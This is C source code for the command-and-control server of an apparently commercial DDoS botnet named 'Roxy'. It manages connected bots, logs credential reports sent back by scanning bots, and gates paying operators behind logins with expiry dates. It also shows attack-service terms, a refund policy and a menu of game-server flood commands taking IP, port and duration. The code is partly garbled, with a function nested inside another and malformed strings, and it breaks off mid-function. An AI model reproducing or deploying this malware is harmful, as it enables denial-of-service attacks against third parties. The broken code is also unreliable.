/*
Roxy方 CNC 

*/ 
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <inttypes.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <arpa/inet.h>
#define MAXFDS 1000000

char *ss_name = "Roxy"; 
char *ss_copyright = "Fuaming";
char *ss_ver = "Roxy 6.0 Updated By Roxy Team";

struct login_info {
	char id[100];
	char password[100];
    char token[100];
    char expirydate[100];
    int cooldown;
    int cooldown_timer;
    int maxtime;
    char ip[300];

};

int checkfloods = 0;

static struct login_info login_infos[100];
struct clientdata_t {
        uint32_t ip;
        char connected;
} clients[MAXFDS];
struct telnetdata_t {
    int connected;
	int id;
	int token;
	int adminstatus;
} managements[MAXFDS];
struct args {
    int sock;
    struct sockaddr_in cli_addr;
};
static volatile FILE *telFD;
static volatile FILE *fileFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int OperatorsConnected = 0;
static volatile int TELFound = 0;
static volatile int scannerreport;

int fdgets(unsigned char *buffer, int bufferSize, int fd) {
	int total = 0, got = 1;
	while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
	return got;
}
void trim(char *str) {
	int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}

static int check_expiry(const int fd)
{
	time_t t = time(0);
	struct tm tm = *localtime(&t);
	int day, month, year, argc = 0;
	day = tm.tm_mday;
	month = tm.tm_mon + 1;
	year = tm.tm_year - 100;
	char *expirydate = calloc(strlen(login_infos[fd].expirydate), sizeof(char));
	strcpy(expirydate, login_infos[fd].expirydate);

	char *args[10 + 1];
	char *p2 = strtok(expirydate, "/");

	while(p2 && argc < 10)
	{
		args[argc++] = p2;// there lol
		p2 = strtok(0, "/");
	}

	if(year > atoi(args[2]) || day > atoi(args[1]) && month >= atoi(args[0]) && year == atoi(args[2]) || month > atoi(args[0]) && year >= atoi(args[2]))\
		return 1;
	return 0;
}// done, wait not yet



static int make_socket_non_blocking (int sfd) {//wtf whyd the cursor change like that, throws me off
	int flags, s;
	flags = fcntl (sfd, F_GETFL, 0);
	if (flags == -1) {
		perror ("fcntl");
		return -1;
	}
	flags |= O_NONBLOCK;
	s = fcntl (sfd, F_SETFL, flags);
    if (s == -1) {
		perror ("fcntl");
		return -1;
	}
	return 0;
}

static void checkmyfloods(int datafd)
{
	char botnet[100];

	if(checkfloods == 0)
	{
		sprintf(botnet, "\e[37mFloods: \e[1;32mONLINE\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	}
	
	if(checkfloods == 1)
	{
		sprintf(botnet, "\e[37mFloods: \e[1;31mOFFLINE\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	}
}

static int create_and_bind (char *port) {
	struct addrinfo hints;
	struct addrinfo *result, *rp;
	int s, sfd;
	memset (&hints, 0, sizeof (struct addrinfo));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;
    s = getaddrinfo (NULL, port, &hints, &result);
    if (s != 0) {
		fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
		return -1;
	}
	for (rp = result; rp != NULL; rp = rp->ai_next) {
		sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
		if (sfd == -1) continue;
		int yes = 1;
		if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
		s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
		if (s == 0) {
			break;
		}
		close (sfd);
	}
	if (rp == NULL) {
		fprintf (stderr, "Could not bind\n");
		return -1;
	}
	freeaddrinfo (result);
	return sfd;
}
void broadcast(char *msg, int us, char *sender)
{
    int i;

    for(i = 0; i < MAXFDS; i++)
    {
        if(clients[i].connected >= 1)
        {
            send(i, msg, strlen(msg), MSG_NOSIGNAL);
            send(i, "\n", 1, MSG_NOSIGNAL);
        }
    }
}
void client_addr(struct sockaddr_in addr, int fd){

	sprintf(login_infos[fd].ip, "%d.%d.%d.%d",
	addr.sin_addr.s_addr & 0xFF,
	(addr.sin_addr.s_addr & 0xFF00)>>8,
	(addr.sin_addr.s_addr & 0xFF0000)>>16,
	(addr.sin_addr.s_addr & 0xFF000000)>>24);
}

void *BotEventLoop(void *useless) {
	struct epoll_event event;
	struct epoll_event *events; //63baa0de836563928e2bd9737cb8f8ad
	int s;
    events = calloc (MAXFDS, sizeof event);
    while (1) {
		int n, i;
		n = epoll_wait (epollFD, events, MAXFDS, -1);
		for (i = 0; i < n; i++) {
			if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN))) {
				clients[events[i].data.fd].connected = 0;
				close(events[i].data.fd);
				continue;
			}
			else if (listenFD == events[i].data.fd) {
               while (1) {
				struct sockaddr in_addr;
                socklen_t in_len;
                int infd, ipIndex;

                in_len = sizeof in_addr;
                infd = accept (listenFD, &in_addr, &in_len);
				if (infd == -1) {
					if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                    else {
						perror ("accept");
						break;
						 }
				}

				clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
				int dup = 0;
				for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++) {
					if(!clients[ipIndex].connected || ipIndex == infd) continue;
					if(clients[ipIndex].ip == clients[infd].ip) {
						dup = 1;
						break;
					}}
				if(dup) {
					if(send(infd, "!* BOTKILL\n", 13, MSG_NOSIGNAL) == -1) { close(infd); continue; }
                    close(infd);
                    continue;
				}
				s = make_socket_non_blocking (infd);
				if (s == -1) { close(infd); break; }
				event.data.fd = infd;
				event.events = EPOLLIN | EPOLLET;
				s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
				if (s == -1) {
					perror ("epoll_ctl");
					close(infd);
					break;
				}
				clients[infd].connected = 1;
			}
			continue;
		}
		else {
			int datafd = events[i].data.fd;
			struct clientdata_t *client = &(clients[datafd]);
			int done = 0;
            client->connected = 1;
			while (1) {
				ssize_t count;
				char buf[2048];
				memset(buf, 0, sizeof buf);
				while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, datafd)) > 0) {
					if(strstr(buf, "\n") == NULL) { done = 1; break; }
					trim(buf);
					if(strcmp(buf, "PING") == 0) {
						if(send(datafd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; }
						continue;
					}
					if(strstr(buf, "REPORT ") == buf) {
						char *line = strstr(buf, "REPORT ") + 7;
						fprintf(telFD, "%s\n", line);
						fflush(telFD);
						TELFound++;
						continue;
					}
					if(strstr(buf, "PROBING") == buf) {
						char *line = strstr(buf, "PROBING");
						scannerreport = 1;
						continue;
					}
					if(strstr(buf, "REMOVING PROBE") == buf) {
						char *line = strstr(buf, "REMOVING PROBE");
						scannerreport = 0;
						continue;
					}
					if(strcmp(buf, "PONG") == 0) {
						continue;
					}
					printf("buf: \"%s\"\n", buf);
				}
				if (count == -1) {
					if (errno != EAGAIN) {
						done = 1;
					}
					break;
				}
				else if (count == 0) {
					done = 1;
					break;
				}
			if (done) {
				client->connected = 0;
				close(datafd);
}}}}}}
unsigned int BotsConnected() {
	int i = 0, total = 0;
	for(i = 0; i < MAXFDS; i++) {
		if(!clients[i].connected) continue;
		total++;
	}
	return total;
}
int Find_Login(char *str) {
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=0;
    char temp[512];

    if((fp = fopen("login.txt", "r")) == NULL){
        return(-1);
    }
    while(fgets(temp, 512, fp) != NULL){
        if((strstr(temp, str)) != NULL){
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);
    if(find_result == 0)return 0;
    return find_line;
}

void *BotWorker(void *sock) {
	int datafd = (int)sock;
	int find_line;
	OperatorsConnected++;
    pthread_t title;
    char buf[2048];
	char* id;
	char* password;
	char* token;
	memset(buf, 0, sizeof buf);
	char botnet[2048];
	memset(botnet, 0, 2048);
	char botcount [2048];
	memset(botcount, 0, 2048);
	char statuscount [2048];
	memset(statuscount, 0, 2048);

	FILE *fp;
	int i=0;
	int c;
	fp=fopen("login.txt", "r");// there, test and see , im going to eat, brb, make sure to change tour login .txt, cooldown, then maxtime, in order
	while(!feof(fp)) {
		c=fgetc(fp);
		++i;
	}
    int j=0;
    rewind(fp);
    while(j!=i-1) {
		fscanf(fp, "%s %s %s %s %d %d", login_infos[j].id, login_infos[j].password, login_infos[j].token, login_infos[j].expirydate, &login_infos[j].cooldown, &login_infos[j].maxtime);
		++j;
	}	
	    char login1 [5000];
        char login2 [5000];
        char login3 [5000];
        char login4 [5000];
        char login5 [5000];
		char login6 [5000];
		char login7 [5000];
		char login8 [5000];
		char login9 [5000];
		char login10 [5000];
		char login11 [5000];
		char login12 [5000];
		char login13 [5000];
		char login14 [5000];
		char login15 [5000];
        char login16 [5000];
        char login17 [5000];

		sprintf(login1,  "\x1b[0mWelcome To \x1b[1;37m%s \x1b[1;37m| \x1b[1;37mVersio\x1b[1;97mn \x1b[1;37m%s \x1b[\x1b[1;97m| \x1b[\x1b[1;97mBy \x1b[1;37m%s\x1b[\x1b[1;97m\r\n", ss_name, ss_ver, ss_copyright);
        sprintf(login2,  "\x1b[1;33m                             ╔══════════════\x1b[1;31m════════════╗\x1b[0m\r\n");
        sprintf(login3,  "\x1b[1;33m                             ║ [+] Terms of \x1b[1;31mService [+] ║\x1b[0m\r\n");
        sprintf(login4,  "\x1b[1;33m   Type           ╔══════════╩══════════════\x1b[1;31m════════════╩═══════════╗\x1b[0m\r\n");                               
        sprintf(login5,  "\x1b[1;33m   Rules          ║-----------------I Unders\x1b[1;31mtand That:--------------║\x1b[0m\r\n");
        sprintf(login6,  "\x1b[1;33m   when           ║-Attacking Government Web\x1b[1;31msites Are Prohibited.   ║\x1b[0m\r\n");
        sprintf(login7,  "\x1b[1;33m   logged in      ║-Attacking Dstats are str\x1b[1;31mictly Prohibbited.      ║\x1b[0m\r\n");
        sprintf(login8,  "\x1b[1;33m   to avoid       ║-Everything I attack is m\x1b[1;31my own Responsibility.   ║\x1b[0m\r\n");
        sprintf(login9,  "\x1b[1;33m   perm ban       ║-Sharing Net Logins/Detai\x1b[1;31mls is Prohibbited.      ║\x1b[0m\r\n");
        sprintf(login10, "\x1b[1;33m                  ║-Spamming attacks to the \x1b[1;31msame IP is prohibbited. ║\x1b[0m\r\n");
        sprintf(login11, "\x1b[1;33m                  ║-If I break any of these \x1b[1;31mrules I will get banned.║\x1b[0m\r\n");
        sprintf(login12, "\x1b[1;33m                  ╚═════════════════╦═══════\x1b[1;31m════════╦═══════════════╝\x1b[0m\r\n");
        sprintf(login13, "\x1b[1;33m                                    ║ Do You\x1b[1;31m Agree? ║\x1b[0m\r\n");
        sprintf(login14, "\x1b[1;33m                                    ╚═══════\x1b[1;31m════════╝\x1b[0m\r\n");
        sprintf(login15, "\x1b[1;32m                                    ╔═════╗  \x1b[1;31m╔═════╗\x1b[0m\r\n");
        sprintf(login16, "\x1b[1;32m                                    ║ Yes.║  \x1b[1;31m║ No. ║\x1b[0m\r\n");
        sprintf(login17, "\x1b[1;32m                                    ╚═════╝  \x1b[1;31m╚═════╝\x1b[0m\r\n");
        
        if(send(datafd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, login1, strlen(login1), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, login2, strlen(login2), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, login3, strlen(login3), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, login4, strlen(login4), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, login5, strlen(login5), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, login6, strlen(login6), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, login7, strlen(login7), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, login8, strlen(login8), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, login9, strlen(login9), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, login10, strlen(login10), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, login11, strlen(login11), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, login12, strlen(login12), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, login13, strlen(login13), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, login14, strlen(login14), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, login15, strlen(login15), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, login16, strlen(login16), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, login17, strlen(login17), MSG_NOSIGNAL) == -1) goto end;
		
		char tos[512];
		sprintf(tos,"\x1b[1;37m");
		if(send(datafd, tos,strlen(tos),MSG_NOSIGNAL) == -1) goto end;
		memset(buf, 0, sizeof buf);
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end; /* no data, kill connection */
        trim(buf);
		if(!strcmp(buf,"Yes") || !strcmp(buf,"No"))
		login:
		for(j=0;j<fscanf;j++) 
        {
            fscanf(fp, "%s %s %s", login_infos[j].id, login_infos[j].password, login_infos[j].token);
        }					
		char clearscreen [2048];
		memset(clearscreen, 0, 2048);
		sprintf(clearscreen, "\033[1A");
		char user [5000];	
		
        sprintf(user, "\x1b[1;91mU\x1b[1;90m: \x1b[1;90m");
		
		if(send(datafd, user, strlen(user), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;
        trim(buf);
		char* nickstring;
		sprintf(login_infos[find_line].id, buf);
        nickstring = ("%s", buf);
        find_line = Find_Login(nickstring);
        if(strcmp(nickstring, login_infos[find_line].id) == 0){
		
		char password [5000];
		if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
		sleep(1);
        sprintf(password, "\x1b[1;93mP\x1b[1;90m: \x1b[1;90m", login_infos[find_line].password);
		if(send(datafd, password, strlen(password), MSG_NOSIGNAL) == -1) goto end;
		
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;

        trim(buf);
        if(strcmp(buf, login_infos[find_line].password) != 0) goto failed;
        memset(buf, 0, 2048);
		
		char token [5000];
		if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
		sleep(1);
        sprintf(token, "\x1b[1;31mToken \x1b[1;31m\x1b[1;31m\x1b[1;31m: \x1b[31m", login_infos[find_line].token);
		if(send(datafd, token, strlen(token), MSG_NOSIGNAL) == -1) goto end;
		
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;

        trim(buf);
        if(strcmp(buf, login_infos[find_line].token) != 0) goto failed;
        memset(buf, 0, 2048);
	

		char Loadingbar21 [500];
		
       
        sprintf(Loadingbar21, "\x1b[1;91m             ♥ Joining Roxy\x1b[1;93m Please Wait ♥     \r\n");
		
		
		if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, Loadingbar21, strlen(Loadingbar21), MSG_NOSIGNAL) == -1) goto end;
		sleep (3);
        goto Banner;
        }
void *TitleWriter(void *sock) {
	int datafd = (int)sock;
    char string[2048];
    while(1) {
		memset(string, 0, 2048);
        sprintf(string,"%c]0; %d ~ Soles | %d ~ Clients | @Fuaming | Spoofed Dedicated Servers 12 | Total Resellers 1 |  %c", '\033', BotsConnected(), OperatorsConnected, '\007');
        if(send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
		sleep(2);
		}
}		
        failed:
		if(send(datafd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
        goto end;

		Banner:
		strcpy(login_infos[datafd].expirydate, login_infos[find_line].expirydate);
		if(check_expiry(datafd) == 1)
		{
			char clearscreen16 [2048];
            memset(clearscreen16, 0, 2048);
            sprintf(clearscreen16, "\033[2J\033[1;1H");    
            if(send(datafd, clearscreen16,  strlen(clearscreen16),    MSG_NOSIGNAL) == -1) goto end;
            send(datafd, "Account Has Expired, Message Admin For Renewal!\r\n", strlen("Account Has Expired, Message Admin For Renewal!\r\n"), MSG_NOSIGNAL); // now
            sleep(5);
            goto end;
        }
		pthread_create(&title, NULL, &TitleWriter, sock);
		char ascii_banner_line0   [5000];
		char ascii_banner_line1   [5000];
		char ascii_banner_line2   [5000];
		char ascii_banner_line3   [5000];
		char ascii_banner_line4   [5000];
		char ascii_banner_line5   [5000];
		char ascii_banner_line6   [5000];
		char ascii_banner_line7   [5000];
		char ascii_banner_line8   [5000];
		char ascii_banner_line9   [5000];
		char ascii_banner_line10   [5000];
		char ascii_banner_line11   [5000];
		char ascii_banner_line12   [5000];
		char ascii_banner_line13   [5000];
		char ascii_banner_line14   [5000];

		
  char clearscreen1 [2048];
  memset(clearscreen1, 0, 2048); 
  sprintf(clearscreen1, "\033[2J\033[1;1H");   	
  sprintf(ascii_banner_line0,  "\x1b[1;92m♠Main News: Big Update On The Way New Methods And More!♠\r\n");             
  sprintf(ascii_banner_line1,  "\x1b[1;97m♠𝓜𝓞𝓣𝓓: 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐑𝐨𝐱𝐲 𝐌𝐚𝐝𝐞 𝐁𝐲 @𝐅𝐮𝐚𝐦𝐢𝐧𝐠!☆                \r\n");
  sprintf(ascii_banner_line2,  "\x1b[1;91m                       ♠\x1b[1;96m██████╗  ██████╗ ██╗  ██╗██╗   ██╗\x1b[1;91m♠  \r\n");
  sprintf(ascii_banner_line3,  "\x1b[1;91m                       ♠\x1b[1;96m██╔══██╗██╔═══██╗╚██╗██╔╝╚██╗ ██╔╝\x1b[1;91m♠     \r\n");
  sprintf(ascii_banner_line4,  "\x1b[1;91m                       ♠\x1b[1;96m██████╔╝██║   ██║ ╚███╔╝  ╚████╔ \x1b[1;91m♠    \r\n");
  sprintf(ascii_banner_line5,  "\x1b[1;91m                       ♠\x1b[1;96m██╔══██╗██║   ██║ ██╔██╗   ╚██╔╝\x1b[1;91m♠  \r\n");
  sprintf(ascii_banner_line6,  "\x1b[1;91m                       ♠\x1b[1;96m██║  ██║╚██████╔╝██╔╝ ██╗   ██║\x1b[1;91m♠  \r\n");
  sprintf(ascii_banner_line7,  "\x1b[1;91m                       ♠\x1b[1;96m╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝\x1b[1;91m♠    \r\n");
  sprintf(ascii_banner_line8,  "\x1b[1;96m\r\n");
  sprintf(ascii_banner_line9,  "\x1b[1;96m\r\n");
  sprintf(ascii_banner_line10, "\x1b[1;91m                 ♠\x1b[1;96m╔══════════════════════════════════════════╗\x1b[1;91m♠ \r\n");
  sprintf(ascii_banner_line11, "\x1b[1;91m                 ♠\x1b[1;96m║                                          ║\x1b[1;91m♠ \r\n"); 
  sprintf(ascii_banner_line12, "\x1b[1;91m                 ♠\x1b[1;96m║   书        𝖜𝖊𝖑𝖈𝖔𝖒𝖊 𝖙𝖔 Roxy       书     ║\x1b[1;91m♠\r\n");
  sprintf(ascii_banner_line13, "\x1b[1;91m                 ♠\x1b[1;96m║                                          ║\x1b[1;91m♠ \r\n");
  sprintf(ascii_banner_line14, "\x1b[1;91m                 ♠\x1b[1;96m╚══════════════════════════════════════════╝\x1b[1;91m♠ \r\n");




		if(send(datafd, clearscreen1,   		strlen(clearscreen1), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line0, strlen(ascii_banner_line0), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line2, strlen(ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line3, strlen(ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line4, strlen(ascii_banner_line4), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line5, strlen(ascii_banner_line5), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line6, strlen(ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line7, strlen(ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line8, strlen(ascii_banner_line8), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line9, strlen(ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line10, strlen(ascii_banner_line10), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line11, strlen(ascii_banner_line11), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line12, strlen(ascii_banner_line12), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line13, strlen(ascii_banner_line13), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line14, strlen(ascii_banner_line14), MSG_NOSIGNAL) == -1) goto end;
		login_infos[datafd].cooldown = login_infos[find_line].cooldown;
		login_infos[datafd].maxtime = login_infos[find_line].maxtime;// there now try
		while(1) {
		char input [5000];
		char input1 [5000];
        sprintf(input, "\x1b[1;93m╔═\x1b[1;93m[\x1b[1;93m%s\x1b[1;93m㊮\x1b[1;93mRoxy㊮\x1b[1;93m] \x1b[0m\r\n", login_infos[find_line].id);
		sprintf(input1,"\x1b[1;93m╚═══════>\x1b[1;91");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, input1, strlen(input1), MSG_NOSIGNAL) == -1) goto end;
		break;
		}
		pthread_create(&title, NULL, &TitleWriter, sock);
        managements[datafd].connected = 1;

		while(fdgets(buf, sizeof buf, datafd) > 0) {   
			if(strstr(buf, "bots")) {
				char botcount [2048];
				memset(botcount, 0, 2048);
				char statuscount [2048];
				char ops [2048];
				memset(statuscount, 0, 2048);
				sprintf(botcount,    "\e[96m[BOTS: \e[97m%d]\r\n", BotsConnected(), OperatorsConnected);		
				sprintf(statuscount, "\e[96m[DUPED: \e[97m%d]\r\n", TELFound, scannerreport);
				sprintf(ops,         "\e[96m[Roxy Users?: \e[97m%d]\r\n", OperatorsConnected, scannerreport);
				if(send(datafd, botcount, strlen(botcount), MSG_NOSIGNAL) == -1) return;
				if(send(datafd, statuscount, strlen(statuscount), MSG_NOSIGNAL) == -1) return;
				if(send(datafd, ops, strlen(ops), MSG_NOSIGNAL) == -1) return;
		char input [5000];
		char input1 [5000];
        sprintf(input, "\x1b[1;93m╔═\x1b[1;93m[\x1b[1;93m%s\x1b[1;93m㊮\x1b[1;93mRoxy㊮\x1b[1;93m] \x1b[0m\r\n", login_infos[find_line].id);
		sprintf(input1,"\x1b[1;93m╚═══════>\x1b[1;91");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, input1, strlen(input1), MSG_NOSIGNAL) == -1) goto end;
				continue;
 		}
 		if(strstr(buf, "+refund") || strstr(buf, "+REFUND") || strstr(buf, "+Refund")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char featuree1  [800];
				char featuree2  [800];
				char featuree3  [800];
				char featuree4  [800];
				char featuree5  [800];
				char featuree6  [800];
				char featuree7  [800];
				char featuree8  [800];
				char featuree9  [800];
				char featuree10  [800];
				char featuree11  [800];
				char featuree12  [800];
				char featuree13  [800];
				char featuree14  [800];
//Refund Tab

				sprintf(featuree1,  "\x1b[1;95m   ╔══════════════════════════════════════════════════╗  \r\n");
				sprintf(featuree2,  "\x1b[1;95m   ║\x1b[1;97m      Welcome To Refund Tab Command +Refund       \x1b[1;95║  \r\n");
				sprintf(featuree3,  "\x1b[1;95m   ║══════════════════════════════════════════════════║  \r\n");
				sprintf(featuree4,  "\x1b[1;95m   ║\x1b[1;97m All Admins Have To Keep Money For 2  Hours       \x1b[1;95║  \r\n");
				sprintf(featuree5,  "\x1b[1;95m   ║\x1b[1;97m Within Them 1 Hours You Are More Than Welcome   \x1b[1;95║  \r\n");
				sprintf(featuree6,  "\x1b[1;95m   ║\x1b[1;97m To Ask For A Refund If It Has Been After The 24  \x1b[1;95║  \r\n");
				sprintf(featuree7,  "\x1b[1;95m   ║\x1b[1;97m Hours And You Ask For A Refund And Have Been     \x1b[1;95║  \r\n");
				sprintf(featuree8,  "\x1b[1;95m   ║\x1b[1;97m Using The Product And Enjoying It You Will Not   \x1b[1;95║  \r\n");
				sprintf(featuree9,  "\x1b[1;95m   ║\x1b[1;97m Be Able To Request A Refund Please Contact       \x1b[1;95║  \r\n");
				sprintf(featuree10, "\x1b[1;95m   ║\x1b[1;97m The Seller Of The Product You Bought And Try     \x1b[1;95║  \r\n");
				sprintf(featuree11, "\x1b[1;95m   ║\x1b[1;97m To Sort Out A Situation With Them Its All Up To  \x1b[1;95║  \r\n");
				sprintf(featuree12, "\x1b[1;95m   ║\x1b[1;97m Them If They Want To Send You A Refund           \x1b[1;95║  \r\n");
			    sprintf(featuree13, "\x1b[1;95m   ║\x1b[1;97m But Support Can Not Help Out With This Situation \x1b[1;95║  \r\n");
				sprintf(featuree14, "\x1b[1;95m   ╚══════════════════════════════════════════════════╝  \r\n");


                sprintf(clearscreen, "\033[2J\033[1;1H");
				if(send(datafd, featuree1,  strlen(featuree1), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, featuree2,  strlen(featuree2), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, featuree3,  strlen(featuree3), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, featuree4,  strlen(featuree4), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, featuree5,  strlen(featuree5), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, featuree6,  strlen(featuree6), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, featuree7,  strlen(featuree7), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, featuree8,  strlen(featuree8), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, featuree9,  strlen(featuree9), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, featuree10,  strlen(featuree10), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, featuree11,  strlen(featuree11), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, featuree12,  strlen(featuree12), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, featuree13,  strlen(featuree13), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, featuree14,  strlen(featuree14), MSG_NOSIGNAL) == -1) goto end;

				pthread_create(&title, NULL, &TitleWriter, sock);
		char input [5000];
		char input1 [5000];
        sprintf(input, "\x1b[1;93m╔═\x1b[1;93m[\x1b[1;93m%s\x1b[1;93m㊮\x1b[1;93mRoxy㊮\x1b[1;93m] \x1b[0m\r\n", login_infos[find_line].id);
		sprintf(input1,"\x1b[1;93m╚═══════>\x1b[1;91");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, input1, strlen(input1), MSG_NOSIGNAL) == -1) goto end;
				continue;
 		}
 		 		if(strstr(buf, "GAiujnME") || strstr(buf, "Gaijnme") || strstr(buf, "gainjme")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char featurev1  [800];
				char featurev2  [800];
				char featurev3  [800];
				char featurev4  [800];
				char featurev5  [800];
				char featurev6  [800];
				char featurev7  [800];
				char featurev8  [800];
				char featurev9  [800];
				char featurev10  [800];
				char featurev11  [800];


				/*
                Welcome To Envoy CNC Where All The ModemOligest come to Slay the devices
				
				Credts to [@oplollie @uqtss]- Cayosin Devs!!  [Credits to @_treqity]for CNC Base 
				*/

				sprintf(featurev1,  "\x1b[1;96m             ╔═══════════════════════════════════════════════╗  \r\n");
				sprintf(featurev2,  "\x1b[1;96m             ║\x1b[1;90m . fn IP PORT TIME 32 1024 10                  \x1b[1;96m║  \r\n");
				sprintf(featurev3,  "\x1b[1;96m             ║\x1b[1;90m . r6 IP PORT TIME 32 1024 10                  \x1b[1;96m║  \r\n");
				sprintf(featurev4,  "\x1b[1;96m             ║\x1b[1;90m . pubg IP PORT TIME 32 1024 10                \x1b[1;96m║  \r\n");
			    sprintf(featurev5,  "\x1b[1;96m             ║\x1b[1;90m . bo4 IP PORT TIME 32 1024 10                 \x1b[1;96m║  \r\n");
			    sprintf(featurev6,  "\x1b[1;96m             ║\x1b[1;90m . game IP PORT TIME 32 1024 10                \x1b[1;96m║  \r\n");
			    sprintf(featurev7,  "\x1b[1;96m             ║\x1b[1;90m . ark IP PORT TIME 32 1024 10                 \x1b[1;96m║  \r\n");
			    sprintf(featurev8,  "\x1b[1;96m             ║\x1b[1;90m . 2k IP PORT TIME 32 1024 10                  \x1b[1;96m║  \r\n");
			    sprintf(featurev9,  "\x1b[1;96m             ║\x1b[1;90m . flop IP PORT TIME 32 1024 10                \x1b[1;96m║  \r\n");
			    sprintf(featurev10, "\x1b[1;96m             ║\x1b[1;90m . fivem IP PORT TIME 32 1024 10               \x1b[1;96m║  \r\n");
				sprintf(featurev11, "\x1b[1;96m             ╚═══════════════════════════════════════════════╝  \r\n");


                sprintf(clearscreen, "\033[2J\033[1;1H");
				if(send(datafd, featurev1,  strlen(featurev1), MSG_NOSIGNAL) == -1) goto end;
